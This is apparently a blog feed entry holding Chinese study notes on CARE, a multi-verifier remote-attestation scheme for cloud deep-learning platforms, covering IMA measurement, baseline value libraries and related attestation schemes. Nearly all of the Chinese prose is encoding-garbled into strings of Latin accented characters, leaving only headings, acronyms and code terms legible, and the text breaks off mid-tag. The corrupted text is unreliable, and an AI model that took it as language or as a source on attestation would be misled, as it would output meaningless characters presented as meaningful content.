    <link href="/2024/11/21/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0%E9%9B%86/"/>
    <url>/2024/11/21/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>æ ¹æœ¬ä¸èƒ½åˆ†è¾¨å“ªäº›è®ºæ–‡æ˜¯å¥½è®ºæ–‡</p><span id="more"></span><h1 id="CARE">CARE</h1><h2 id="Abstract">Abstract</h2><p>è¯¥æ–¹æ³•æ˜¯ä¸€ç§äº‘å¹³å°å¯ä¿¡æ€§éªŒè¯çš„æ–°æ–¹æ³•ã€‚æå‡ºäº†åŸºäºå¤šä¸ªéªŒè¯è€…è¿œç¨‹è®¤è¯çš„æ–¹æ³•ã€‚</p><p>CAREæ—¨åœ¨æé«˜è¿œç¨‹è®¤è¯çš„å®ç”¨æ€§å’Œæ•ˆç‡ï¼Œå¹¶è§£å†³æ¶‰åŠå¤šä¸ªåˆ©ç›Šç›¸å…³è€…çš„ç¯å¢ƒä¸­çš„å®‰å…¨å’Œä¿¡ä»»é—®é¢˜ã€‚</p><ul><li>é‡‡ç”¨ç¾¤ä½“éªŒè¯çš„æ¦‚å¿µï¼Œé‡‡ç”¨å¤šä¸ªéªŒè¯è€…çš„å¾ªç¯åä½œæ¨¡å‹æ¥æ”¶é›†å’ŒéªŒè¯è¯æ®ï¼Œä»è€Œè§£å†³ä¿¡ä»»é—®é¢˜ï¼Œæé«˜éªŒè¯æ•ˆç‡ã€‚</li><li>å¼•å…¥äº†ç²¾å¿ƒè®¾è®¡çš„è¿‡æ»¤æœºåˆ¶ï¼Œä»¥éä¾µå…¥å¼æ–¹å¼è§£å†³éªŒè¯ç»“æœä¸­çš„è¯¯æŠ¥é—®é¢˜ã€‚</li><li>é‡‡ç”¨å¤šå‘æ ‘å½¢ç»“æ„æ¥æ„å»ºåŸºçº¿å€¼åº“ï¼Œä»è€Œå¢å¼ºäº†ç³»ç»Ÿçš„çµæ´»æ€§å’Œç»†ç²’åŒ–ç®¡ç†èƒ½åŠ›ã€‚</li></ul><p>CARE å¯è§£å†³å› åº”ç”¨å±‚æ¿€æ´»å®Œæ•´æ€§æµ‹é‡æ¶æ„ (<code>IMA</code>) è€Œå¯¼è‡´è¿œç¨‹éªŒè¯ç»“æœä¸å‡†ç¡®çš„é¦–ä¸ªå®ç”¨è§£å†³æ–¹æ¡ˆã€‚</p><h3 id="çŸ¥è¯†è¡¥å……">çŸ¥è¯†è¡¥å……</h3><h3 id="ä»€ä¹ˆæ˜¯åŸºçº¿å€¼åº“ï¼ˆBaseline-Value-Libraryï¼‰ï¼Ÿ">ä»€ä¹ˆæ˜¯åŸºçº¿å€¼åº“ï¼ˆBaseline Value Libraryï¼‰ï¼Ÿ</h3><p><strong>åŸºçº¿å€¼</strong>æ˜¯ç³»ç»Ÿä¸­æŸäº›å…³é”®å¯¹è±¡ï¼ˆå¦‚æ–‡ä»¶ã€é…ç½®é¡¹ã€å†…æ ¸æ¨¡å—ç­‰ï¼‰åœ¨å¯ä¿¡çŠ¶æ€ä¸‹çš„å‚è€ƒå€¼ã€‚è¿™äº›å€¼å¯ä»¥æ˜¯æ–‡ä»¶çš„å“ˆå¸Œå€¼æˆ–ç­¾åï¼ˆå¦‚ SHA-256 å“ˆå¸Œï¼‰ã€ç³»ç»Ÿé…ç½®é¡¹çš„å‚æ•°å€¼ï¼ˆå¦‚å®‰å…¨ç­–ç•¥ã€ç½‘ç»œè§„åˆ™ï¼‰ã€åº”ç”¨ç¨‹åºçš„ç‰ˆæœ¬ä¿¡æ¯ã€è¿è¡Œç¯å¢ƒçš„çŠ¶æ€æè¿°ç­‰</p><h3 id="ä»€ä¹ˆæ˜¯å®Œæ•´æ€§æµ‹é‡æ¶æ„ï¼ˆIMAï¼‰ï¼Ÿ">ä»€ä¹ˆæ˜¯å®Œæ•´æ€§æµ‹é‡æ¶æ„ï¼ˆIMAï¼‰ï¼Ÿ</h3><ul><li><p><strong>IMA çš„ä½œç”¨</strong>æ˜¯æµ‹é‡ç³»ç»Ÿä¸­å…³é”®ç»„ä»¶ï¼ˆå¦‚å†…æ ¸æ¨¡å—ã€æ–‡ä»¶ã€åº”ç”¨ç¨‹åºç­‰ï¼‰çš„å®Œæ•´æ€§ï¼Œå¹¶ç”Ÿæˆå¯¹åº”çš„å“ˆå¸Œå€¼ã€‚è¿™äº›å“ˆå¸Œå€¼ä¼šè¢«è®°å½•åœ¨æ—¥å¿—ä¸­æˆ–å­˜å‚¨åˆ° <code>TPM</code>ï¼ˆå¯ä¿¡å¹³å°æ¨¡å—ï¼‰çš„ <code>PCR</code>ï¼ˆå¹³å°é…ç½®å¯„å­˜å™¨ï¼‰ä¸­ã€‚</p></li><li><p>è¿œç¨‹éªŒè¯é€šå¸¸é€šè¿‡è·å–è¿™äº›æµ‹é‡å€¼å¹¶æ¯”å¯¹é¢„æœŸçš„å€¼ï¼Œæ¥æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦è¢«ç¯¡æ”¹ã€‚</p></li></ul><h3 id="ä»€ä¹ˆæ˜¯åº”ç”¨å±‚æ¿€æ´»-IMAï¼Ÿ">ä»€ä¹ˆæ˜¯åº”ç”¨å±‚æ¿€æ´» IMAï¼Ÿ</h3><ul><li><strong>æ¿€æ´» IMA</strong> æ˜¯æŒ‡è§¦å‘ <code>IMA </code>æ¥å¯¹æŸäº›å¯¹è±¡ï¼ˆå¦‚æ–‡ä»¶ã€ç¨‹åºï¼‰è¿›è¡Œå®Œæ•´æ€§æµ‹é‡ã€‚</li><li><strong>åº”ç”¨å±‚æ¿€æ´» IMA</strong> æ˜¯æŒ‡è¿™ç§è§¦å‘æ˜¯ç”±åº”ç”¨å±‚çš„æ“ä½œå¯¼è‡´çš„ï¼Œä¾‹å¦‚æŸä¸ªåº”ç”¨ç¨‹åºè¯»å–æ–‡ä»¶æˆ–åŠ è½½æ¨¡å—æ—¶è§¦å‘äº† <code>IMA</code>çš„æµ‹é‡ã€‚</li></ul><h3 id="ä¸ºä»€ä¹ˆä¼šå¯¼è‡´è¿œç¨‹éªŒè¯ä¸å‡†ç¡®ï¼Ÿ">ä¸ºä»€ä¹ˆä¼šå¯¼è‡´è¿œç¨‹éªŒè¯ä¸å‡†ç¡®ï¼Ÿ</h3><ol><li><p><strong>æµ‹é‡ç»“æœçš„ä¸ä¸€è‡´æ€§ï¼š</strong></p><p>å¦‚æœæµ‹é‡æ˜¯åœ¨åº”ç”¨å±‚åŠ¨æ€è§¦å‘çš„ï¼Œä¸åŒæ—¶é—´ã€ä¸åŒæ¡ä»¶ä¸‹æ¿€æ´»<code>IMA</code>ï¼Œæµ‹é‡çš„ç»“æœå¯èƒ½ä¼šå—è¿è¡Œæ—¶çš„ä¸Šä¸‹æ–‡å½±å“ã€‚ä¾‹å¦‚ï¼ŒæŸäº›åŠ¨æ€ç”Ÿæˆçš„æ–‡ä»¶æˆ–ä¸´æ—¶æ–‡ä»¶åœ¨æµ‹é‡æ—¶çš„å“ˆå¸Œå€¼å¯èƒ½ä¼šå˜åŒ–ï¼Œå¯¼è‡´æµ‹é‡å€¼ä¸é¢„æœŸä¸ä¸€è‡´ã€‚</p></li><li><p><strong>ä¸å¯é¢„æµ‹çš„æµ‹é‡å€¼ï¼š</strong></p><p>åº”ç”¨å±‚çš„æ“ä½œæœ‰æ—¶ä¼šè®¿é—®æ–‡ä»¶æˆ–æ¨¡å—ï¼Œè¿™äº›è®¿é—®å¯èƒ½å¹¶ä¸æ€»æ˜¯æŒ‰ç…§å›ºå®šé¡ºåºè¿›è¡Œã€‚è¿™ç§ä¸ç¡®å®šæ€§ä¼šå¯¼è‡´æµ‹é‡å€¼çš„é¡ºåºå’Œå†…å®¹ä¸é¢„æœŸå€¼ä¸ç¬¦ï¼Œå½±å“è¿œç¨‹éªŒè¯ã€‚</p></li><li><p><strong>æµ‹é‡ä¸é¢„æœŸèŒƒå›´ä¸ä¸€è‡´ï¼š</strong></p><p>è¿œç¨‹éªŒè¯é€šå¸¸ä¾èµ–äºé¢„å®šä¹‰çš„ç­–ç•¥æ¥éªŒè¯ç‰¹å®šå¯¹è±¡ï¼ˆå¦‚å†…æ ¸æˆ–å…³é”®é…ç½®æ–‡ä»¶ï¼‰ã€‚åº”ç”¨å±‚è§¦å‘<code>IMA</code>åï¼Œå¯èƒ½æµ‹é‡äº†é¢å¤–çš„ã€éå…³é”®çš„å¯¹è±¡ï¼Œæˆ–è€…æ²¡æœ‰æµ‹é‡åˆ°ç­–ç•¥è¦æ±‚çš„å¯¹è±¡ï¼Œä»è€Œå¯¼è‡´è¿œç¨‹éªŒè¯å¤±è´¥ã€‚</p></li><li><p><strong>åŠ¨æ€æ•°æ®çš„æµ‹é‡é—®é¢˜ï¼š</strong></p><p>åº”ç”¨å±‚å¯èƒ½æ¶‰åŠåŠ¨æ€ç”Ÿæˆçš„æ•°æ®ï¼ˆå¦‚æ—¥å¿—ã€ç¼“å­˜æ–‡ä»¶ï¼‰ã€‚è¿™äº›æ•°æ®çš„å®Œæ•´æ€§æµ‹é‡åœ¨è¿œç¨‹éªŒè¯æ—¶å¯èƒ½æ²¡æœ‰æ„ä¹‰ï¼Œå› ä¸ºå…¶å“ˆå¸Œå€¼ä¼šéšæ—¶é—´æˆ–æ“ä½œè€Œå˜åŒ–ã€‚</p></li></ol><h2 id="Introduction">Introduction</h2><h3 id="æ·±åº¦å­¦ä¹ å³æœåŠ¡-DLaaS">æ·±åº¦å­¦ä¹ å³æœåŠ¡(DLaaS)</h3><p><strong>DLaaS</strong>ï¼ˆ<strong>Deep Learning as a Service</strong>ï¼‰æ˜¯ä¸€ç§åŸºäºäº‘è®¡ç®—å¹³å°çš„æœåŠ¡æ¨¡å‹ï¼Œå®ƒå…è®¸ç”¨æˆ·é€šè¿‡äº‘ç«¯æä¾›çš„æ·±åº¦å­¦ä¹ åŸºç¡€è®¾æ–½ã€ç®—æ³•å’Œå·¥å…·æ¥è¿›è¡Œæ¨¡å‹è®­ç»ƒã€æ¨ç†å’Œå¼€å‘ï¼Œè€Œæ— éœ€è‡ªè¡Œé…ç½®å’Œç®¡ç†ç¡¬ä»¶èµ„æºã€‚</p><p>åœ¨<code>DLaaS</code>çš„ç”Ÿæ€ç³»ç»Ÿä¸­ï¼Œæœ‰å¤šä¸ªæœåŠ¡æä¾›è€…ï¼Œæ¯ä¸ªéƒ½æœ‰ä¸åŒçš„è§’è‰²ï¼Œå¦‚æ¨¡å‹æä¾›è€…ã€è®¡ç®—æä¾›è€…å’Œåº”ç”¨ç¨‹åºæä¾›è€…ï¼Œåä½œæä¾›ä¸“é—¨çš„æœåŠ¡ã€‚</p><p><strong>ç¼ºç‚¹</strong>ï¼šå¤šæ–¹çš„å‚ä¸å’Œå…¬å…±äº‘ç¯å¢ƒä¸­çš„æ“ä½œå¯¼è‡´æ•°æ®å’Œæ¨¡å‹æä¾›å•†åœ¨å°†ä»–ä»¬çš„çŸ¥è¯†äº§æƒä¸Šä¼ åˆ°äº‘æ—¶çŠ¹è±«ä¸å†³ï¼Œæ‹…å¿ƒä»–ä»¬çš„çŸ¥è¯†äº§æƒè¢«æ³„éœ²æˆ–æ»¥ç”¨ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241121194556998.png" alt="image-20241121194556998"></p><ul><li><p><strong>è§£å†³1</strong>ï¼š</p><p>å¦‚åŒæ€åŠ å¯†(<code>HE</code>)å’Œå®‰å…¨å¤šæ–¹è®¡ç®—(<code>MPC</code>)ç­‰éšç§è®¡ç®—æŠ€æœ¯æä¾›äº†ä¸€äº›å®‰å…¨æªæ–½ã€‚å±€é™æ€§ï¼šå†…å­˜è®¡ç®—æœŸé—´çš„æ”»å‡»é£é™©ï¼Œå¹¶ä¸”è¿™ä¸¤ç§æ–¹æ³•éƒ½è¦æ±‚æ¨¡å‹å’Œæ•°æ®é›†æä¾›è€…å®Œå…¨ä¿¡ä»»æ‰§è¡Œè®¡ç®—ä»»åŠ¡çš„äº‘å¹³å°ã€‚</p></li><li><p><strong>è§£å†³2</strong>ï¼š</p><p>è¿œç¨‹è¯æ˜æœºåˆ¶å¯è§£å†³äº‘å¹³å°çš„å¯ä¿¡åº¦é—®é¢˜</p></li></ul><h3 id="è¿œç¨‹è¯æ˜-RA">è¿œç¨‹è¯æ˜(RA)</h3><p><strong>RAï¼ˆRemote Attestationï¼‰</strong> æ˜¯ä¸€ç§ç”¨äºéªŒè¯å’Œè¯„ä¼°è¿œç¨‹ç³»ç»Ÿï¼ˆå¦‚æœåŠ¡å™¨ã€ç‰©è”ç½‘è®¾å¤‡ã€è™šæ‹Ÿæœºç­‰ï¼‰å¯ä¿¡çŠ¶æ€çš„æŠ€æœ¯ã€‚å®ƒé€šè¿‡å‘éªŒè¯æ–¹ï¼ˆé€šå¸¸æ˜¯ç®¡ç†ç³»ç»Ÿæˆ–ä¿¡ä»»ä¸­å¿ƒï¼‰æä¾›ç³»ç»Ÿçš„å¯ä¿¡çŠ¶æ€è¯æ˜ï¼Œç¡®ä¿è¿œç¨‹è®¾å¤‡æ²¡æœ‰è¢«ç¯¡æ”¹æˆ–å—åˆ°æ”»å‡»ï¼Œä»è€Œå»ºç«‹ä¿¡ä»»å…³ç³»ã€‚</p><ol><li><p><strong>å•ä¸ªéªŒè¯å™¨</strong></p><p>ç¼ºç‚¹ï¼šé›†ä¸­å¼éªŒè¯æ¨¡å¼ï¼Œå®¹æ˜“é€ æˆç“¶é¢ˆï¼Œå°¤å…¶æ˜¯å»¶è¿Ÿã€‚</p></li><li><p><strong>èœ‚ç¾¤éªŒè¯æœºåˆ¶</strong></p><p>ä¼˜ç‚¹ï¼šç¼©çŸ­äº†æ€»éªŒè¯æ—¶é—´ï¼Œè§„é¿äº†å•ä¸ªéªŒè¯å™¨å¯èƒ½å­˜åœ¨çš„æ‹¥å µã€‚</p><p>ç¼ºç‚¹ï¼šä¸»è¦åº”ç”¨äºç‰©è”ç½‘ï¼ˆ<code>IoT</code>ï¼‰åœºæ™¯ï¼Œå¾ˆéš¾è¿ç§»åˆ°äº‘ç¯å¢ƒã€‚</p></li></ol><p><strong>ç¼ºç‚¹</strong>ï¼š<code>IMA</code> æµ‹é‡æ‰€æœ‰äºŒè¿›åˆ¶æ–‡ä»¶åŠ è½½ã€æ¨¡å—åŠ è½½å’ŒåŠ¨æ€é“¾æ¥åº“åŠ è½½ï¼Œå¹¶å°†æŒ‡æ ‡è®°å½•åœ¨æ—¥å¿—ä¸­ã€‚å› æ­¤ï¼Œå³ä½¿æ˜¯ç”Ÿå‘½å‘¨æœŸæçŸ­çš„æ–‡ä»¶ä¹Ÿä¼šè¢«æµ‹é‡å’Œè®°å½•ã€‚è®°å½•ç”Ÿå‘½å‘¨æœŸæçŸ­çš„æ–‡ä»¶å¯èƒ½ä¼šå¯¹éªŒè¯ç»“æœçš„ç²¾ç¡®æ€§äº§ç”Ÿä¸åˆ©å½±å“ã€‚</p><h2 id="Related-Work">Related Work</h2><p>æ·±åº¦å­¦ä¹ ç³»ç»Ÿå®‰å…¨å’Œè™šæ‹Ÿæœºå¯ä¿¡çŠ¶æ€è¯æ˜çš„ç›¸å…³å·¥ä½œ</p><h3 id="Deep-Learning-System-Security">Deep Learning System Security</h3><ul><li><p>åŸºäºéšç§è®¡ç®—æŠ€æœ¯</p><p>ä¼˜ç‚¹ï¼šéšç§ä¿æŠ¤æ–¹æ³•å¯ä»¥é˜²æ­¢æ¨¡å‹çªƒå–å’Œç¯¡æ”¹ã€‚</p><p>ç¼ºç‚¹ï¼šå¯èƒ½å­˜åœ¨è®¡ç®—é€Ÿåº¦å’Œå‡†ç¡®æ€§é™ä½ç­‰é—®é¢˜ã€‚</p></li><li><p>åˆ©ç”¨å®‰å…¨çš„æ‰§è¡Œç¯å¢ƒè¿›è¡Œç³»ç»Ÿä¿æŠ¤</p><p>ä¼˜ç‚¹ï¼šæä¾›äº†å¯ä¿¡çš„æ‰§è¡Œç¯å¢ƒï¼Œæœ‰æ•ˆåœ°é˜²æ­¢äº†ä»£ç å’Œæ•°æ®æ³„æ¼</p><p>ç¼ºç‚¹ï¼šå—æœ‰é™çš„å¯ä¿¡å†…å­˜çš„é™åˆ¶ï¼Œå› æ­¤å¾ˆéš¾ç¡®ä¿åœ¨æ•°æ®çš„å­˜å‚¨ã€ä¼ è¾“å’Œè®¡ç®—ç”Ÿå‘½å‘¨æœŸä¸­æä¾›å…¨é¢ä¿æŠ¤ã€‚</p></li></ul><h3 id="Hardware-based-Remote-Attestation">Hardware-based Remote Attestation</h3><p>åŸºäºç¡¬ä»¶çš„è¯æ˜ä¾èµ–äºç‰©ç†èŠ¯ç‰‡å’Œæ¨¡å—ï¼Œå¦‚<code>TPM</code>å’ŒIntel <code>SGX</code>ï¼Œä»¥æä¾›é«˜çº§åˆ«çš„å®‰å…¨æ€§ã€‚</p><p><code>TPM</code>æ”¯æŒå®‰å…¨å­˜å‚¨å’Œè®¡ç®—ã€‚<code>SGX</code> é€šè¿‡ç¡¬ä»¶ç¡®ä¿åº”ç”¨ç¨‹åºçš„æœºå¯†æ€§å’Œå®Œæ•´æ€§ï¼Œç„¶è€Œï¼Œ<code>SGX</code>ä¾èµ–äºç‰©ç†CPUï¼Œç”±äºç¡¬ä»¶ç¯å¢ƒçš„å˜åŒ–ï¼Œåœ¨<code>VM</code>è¿ç§»æœŸé—´ä¼šå¸¦æ¥æŒ‘æˆ˜ã€‚</p><p>åœ¨äº‘ç¯å¢ƒä¸­ï¼ŒéªŒè¯è™šæ‹Ÿæœºçš„å¯ä¿¡æ€§éœ€è¦åŒæ—¶éªŒè¯è™šæ‹Ÿæœºã€ä¸»æœºå’Œç®¡ç†ç¨‹åºï¼Œè¿™å«åšè™šæ‹Ÿæœºæ·±åº¦éªŒè¯ã€‚<code>TCG</code>æå‡ºçš„åˆ†æ®µæµ‹é‡æ¡†æ¶å°†è™šæ‹Ÿæœºä¸ä¸»æœºéªŒè¯åˆ†å¼€ï¼Œä½†è¿™ç§æ–¹æ³•å­˜åœ¨å†—ä½™é—®é¢˜ã€‚</p><p>å½“å¤šå°è™šæ‹Ÿæœºè¿è¡Œåœ¨åŒä¸€å°ä¸»æœºä¸Šæ—¶ï¼Œå¯¹æ¯å°è™šæ‹Ÿæœºè¿›è¡Œè¿œç¨‹éªŒè¯éœ€è¦é‡å¤æ”¶é›†ä¸»æœºè¯æ®ï¼Œæ•ˆç‡è¾ƒä½ã€‚</p><blockquote><p>TVP-PCA</p><ul><li>ä¼˜ç‚¹ï¼šä½¿ç”¨ä¿¡ä»»é“¾å’ŒMACåœ°å€ç®—æ³•è§£å†³äº†èº«ä»½é—®é¢˜ã€‚é€šè¿‡éªŒè¯æµ‹é‡æ—¥å¿—å’ŒPCRå€¼æä¾›æ›´é«˜çš„å‡†ç¡®æ€§ï¼Œä»è€Œèƒ½å¤Ÿè¯†åˆ«å—æŸè®¾å¤‡å¹¶ç²¾ç¡®å®šä½å—å½±å“çš„ç»„ä»¶</li><li>ä¸è¶³ï¼šæ— æ³•è§£å†³ä¸»æœºè¯æ®æ”¶é›†è¿‡å¤šçš„é—®é¢˜ã€‚</li></ul></blockquote><blockquote><p>CloudTA</p><p>è¯¥æ¡†æ¶å°†åŒä¸€ä¸»æœºä¸Šæ‰€æœ‰vmçš„æµ‹é‡æ‰©å±•åˆ°åŒä¸€å¯„å­˜å™¨ï¼Œä»è€Œå®ç°ç»„éªŒè¯ã€‚</p><ul><li>ä¼˜ç‚¹ï¼šæé«˜äº†éªŒè¯æ•ˆç‡ï¼Œè§£å†³äº†å†—ä½™é—®é¢˜ã€‚é€šè¿‡éªŒè¯æµ‹é‡æ—¥å¿—å’ŒPCRå€¼æä¾›æ›´é«˜çš„å‡†ç¡®æ€§ï¼Œä»è€Œèƒ½å¤Ÿè¯†åˆ«å—æŸè®¾å¤‡å¹¶ç²¾ç¡®å®šä½å—å½±å“çš„ç»„ä»¶</li><li>ä¸è¶³ï¼šæ— æ³•å¯¹è™šæ‹Ÿæœºå†…éƒ¨çŠ¶æ€è¿›è¡Œé’ˆå¯¹æ€§çš„éªŒè¯ï¼Œæ— æ³•åˆ¤æ–­åº”ç”¨çš„å¯ä¿¡å¯åŠ¨çŠ¶æ€ã€‚</li></ul></blockquote><p>éšç€RAçš„åº”ç”¨å¢å¤šï¼Œä¼ ç»Ÿé›†ä¸­å¼éªŒè¯æ¨¡å¼éš¾ä»¥é€‚åº”ã€‚<code>èœ‚ç¾¤è®¤è¯</code>æˆä¸ºè§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡å¹¿æ’­æˆ–åˆ†å±‚ç»“æ„ï¼Œé«˜æ•ˆæœåŠ¡å¤šä¸ªèŠ‚ç‚¹ã€‚</p><p>å¹¿æ’­é€‚ç”¨äºç½‘ç»œæ‹“æ‰‘å˜åŒ–é¢‘ç¹ä½†é€šä¿¡å¼€é”€é«˜ä¸”å®¹æ˜“å‘ç”Ÿå¹¿æ’­é£æš´çš„åœºæ™¯ã€‚</p><p>åˆ†å±‚è®¤è¯æ›´é€‚åˆå…·æœ‰ä¸åŒèµ„æºèƒ½åŠ›çš„è®¾å¤‡é›†ç¾¤ã€‚</p><blockquote><p>ESDRA</p><ul><li>ä¼˜ç‚¹ï¼šåˆ†å¸ƒå¼è®¾è®¡å‡å°‘äº†æ—¶é—´å¼€é”€ã€‚</li><li>ç¼ºç‚¹ï¼šå¤šä¸ªé‚»å±…åŒæ—¶å¯¹å•ä¸ªè¯æ˜è€…è¿›è¡Œè®¤è¯ä¼šå¢åŠ è®¡ç®—å’Œå†…å­˜æˆæœ¬ã€‚åªåŒ…å«è®¾å¤‡çš„æœ€ç»ˆå“ˆå¸Œå€¼ï¼Œæ— æ³•ç²¾ç¡®å®šä½åˆ°ç»„ä»¶ã€‚</li></ul></blockquote><blockquote><p>SARA</p><ul><li>ä¼˜ç‚¹ï¼šä¿è¯ç‰©è”ç½‘è®¾å¤‡ä¸Šè¿è¡Œçš„è½¯ä»¶çš„å®‰å…¨æ€§ã€‚</li><li>ç¼ºç‚¹ï¼šé›†ä¸­è®¤è¯æœºåˆ¶éœ€è¦å°†æ•´ä¸ªè®¾å¤‡ç»„çš„è¯æ®æŠ¥å‘Šç»™éªŒè¯æ–¹ï¼Œå¯¼è‡´è¯æ®æ•°æ®é‡éšç€æœåŠ¡æ•°é‡çš„å¢åŠ å‘ˆçº¿æ€§å¢é•¿ã€‚åªåŒ…å«è®¾å¤‡çš„æœ€ç»ˆå“ˆå¸Œå€¼ï¼Œæ— æ³•ç²¾ç¡®å®šä½åˆ°ç»„ä»¶ã€‚</li></ul></blockquote><blockquote><p>FeSA</p><p>ç¬¬ä¸€ä¸ªå°†æœºå™¨å­¦ä¹ åº”ç”¨äºç¾¤ä½“è®¤è¯æ–¹æ¡ˆ</p><ul><li>ä¼˜ç‚¹ï¼šéªŒè¯è€…æ ¹æ®å…¶è¡Œä¸ºè¯†åˆ«å¯ç–‘è®¾å¤‡å¹¶æ‰§è¡Œè¯æ˜ï¼Œä»è€Œå‡å°‘äº†è¯æ˜è€…çš„å¼€é”€ã€‚</li><li>ç¼ºç‚¹ï¼šç”±äºæœºå™¨å­¦ä¹ ç®—æ³•å›ºæœ‰çš„å‡é˜³æ€§å’Œå‡é˜´æ€§ç‡ï¼Œè®¾å¤‡çŠ¶æ€è¯„ä¼°çš„å‡†ç¡®æ€§æœ‰å¾…è¿›ä¸€æ­¥ç ”ç©¶ã€‚</li></ul></blockquote><blockquote><p>DeepTrust</p><p>ä¹Ÿæ˜¯ä½¿ç”¨æœºå™¨å­¦ä¹ æ¥è¯„ä¼°ç‰©è”ç½‘è®¾å¤‡çš„å¯ä¿¡åº¦ã€‚</p></blockquote><p>ä¸ºäº†ç¼“è§£ä¾èµ–äºå•ä¸ªéªŒè¯è€…çš„è¿œç¨‹è®¤è¯æ–¹æ¡ˆå¯èƒ½é¢ä¸´å•ç‚¹æ•…éšœçš„é£é™©ï¼ŒåŸºäºç¬¬ä¸‰æ–¹æœåŠ¡çš„è¿œç¨‹è®¤è¯è§£å†³æ–¹æ¡ˆåˆ©ç”¨<code>SGX</code>æ¥ç¡®ä¿éªŒè¯è¿‡ç¨‹çš„å®‰å…¨æ€§ã€‚</p><blockquote><p>DVRA</p><ul><li>ä¼˜ç‚¹ï¼š</li><li>ç¼ºç‚¹ï¼šSGXå°è£…çš„å†…å­˜é™åˆ¶å’Œé¢‘ç¹çš„åˆ†é¡µæ“ä½œä¸¥é‡å½±å“äº†å¤§è§„æ¨¡è®¤è¯ä»»åŠ¡çš„æ•ˆç‡ã€‚</li></ul></blockquote><blockquote><p>ZKSA</p><p>ä¸€ä¸ªåŸºäºé›¶çŸ¥è¯†è¯æ˜ï¼ˆZKPï¼‰çš„å»ä¸­å¿ƒåŒ–è¿œç¨‹è®¤è¯åè®®</p><ul><li>ä¼˜ç‚¹ï¼šæ”¯æŒè¯æ˜è€…å’Œå¤šä¸ªéªŒè¯è€…ä¹‹é—´çš„éäº¤äº’å¼éªŒè¯è¿‡ç¨‹ï¼Œå¢å¼ºäº†è®¤è¯è¿‡ç¨‹çš„å®‰å…¨æ€§ã€‚</li><li>ç¼ºç‚¹ï¼šè®¡ç®—å¼€é”€å¤§ï¼Œè®¾å¤‡è¦æ±‚é«˜ã€‚</li></ul></blockquote><p>æ€»çš„æ¥è¯´ï¼Œä¸Šè¿°æ–¹æ¡ˆä¸è€ƒè™‘è®¾å¤‡é€€å‡ºï¼Œåªéƒ¨åˆ†è€ƒè™‘æ–°è®¾å¤‡åŠ å…¥ã€‚ç¾¤ä½“è®¤è¯æ¨¡å¼å¯ä»¥æœ‰æ•ˆåœ°è¯„ä¼°é›†ç¾¤çš„å¯ä¿¡åº¦ï¼Œä½†ç”±äºç»“æœèšé›†ï¼Œæ— æ³•æ¨æ–­å•ä¸ªèŠ‚ç‚¹çš„å†…éƒ¨çŠ¶æ€ã€‚ZKSAã€DVRAã€ESDRAå’ŒSARAåœ¨è„±æœºé˜¶æ®µéƒ¨ç½²è½¯ä»¶ï¼Œä½†åœ¨ç¨‹åºå¯åŠ¨æ—¶ç¼ºä¹å®Œæ•´æ€§æ£€æŸ¥ã€‚åˆ†æ®µè®¤è¯æ–¹æ³•å¯ä»¥éªŒè¯è™šæ‹Ÿæœºçš„å¯ä¿¡æ€§ï¼Œä½†å­˜åœ¨ä¸»æœºä¿¡æ¯æ”¶é›†è¿‡å¤šçš„é—®é¢˜ã€‚åŸºäºç®¡ç†ç¨‹åºçš„å¹¶å‘è®¤è¯ç¡®ä¿è™šæ‹Ÿæœºçš„å¯ä¿¡å¼•å¯¼ï¼Œä½†åœ¨éªŒè¯è™šæ‹Ÿæœºå†…åº”ç”¨ç¨‹åºçš„å¯ä¿¡åº¦æ–¹é¢å—åˆ°é™åˆ¶ã€‚</p><h4 id="é›¶çŸ¥è¯†è¯æ˜å¤ä¹ ï¼š">é›¶çŸ¥è¯†è¯æ˜å¤ä¹ ï¼š</h4><p><strong>é›¶çŸ¥è¯†è¯æ˜ï¼ˆZero-Knowledge Proof, ZKPï¼‰</strong> æ˜¯ä¸€ç§å¯†ç å­¦æ–¹æ³•ï¼Œå…è®¸è¯æ˜è€…å‘éªŒè¯è€…è¯æ˜æŸä»¶äº‹æ˜¯çœŸå®çš„ï¼Œè€Œ<strong>æ— éœ€é€éœ²è¯æ˜è¿‡ç¨‹ä¸­çš„ä»»ä½•é¢å¤–ä¿¡æ¯</strong>ã€‚å®ƒçš„æ ¸å¿ƒç‰¹ç‚¹æ˜¯ç¡®ä¿éšç§å’Œå®‰å…¨ï¼ŒåŒæ—¶å®Œæˆå¯ä¿¡éªŒè¯ã€‚</p><p><strong>é›¶çŸ¥è¯†è¯æ˜çš„ä¸‰ä¸ªå…³é”®ç‰¹æ€§</strong>ï¼š</p><ol><li><p><strong>å®Œæ•´æ€§ï¼ˆCompletenessï¼‰</strong><br>å¦‚æœå£°æ˜æ˜¯çœŸå®çš„ï¼Œè¯šå®çš„è¯æ˜è€…å¯ä»¥è®©éªŒè¯è€…ç›¸ä¿¡å®ƒæ˜¯çœŸå®çš„ã€‚</p></li><li><p><strong>å¯é æ€§ï¼ˆSoundnessï¼‰</strong><br>å¦‚æœå£°æ˜æ˜¯å‡çš„ï¼Œè¯æ˜è€…æ— æ³•æ¬ºéª—éªŒè¯è€…ï¼Œä½¿å…¶ç›¸ä¿¡å£°æ˜æ˜¯çœŸå®çš„ã€‚</p></li><li><p><strong>é›¶çŸ¥è¯†æ€§ï¼ˆZero-Knowledgeï¼‰</strong><br>éªŒè¯è€…åªèƒ½ç¡®è®¤å£°æ˜çš„çœŸå®æ€§ï¼Œä½†æ— æ³•è·å–ä»»ä½•é¢å¤–ä¿¡æ¯ã€‚</p></li></ol><h4 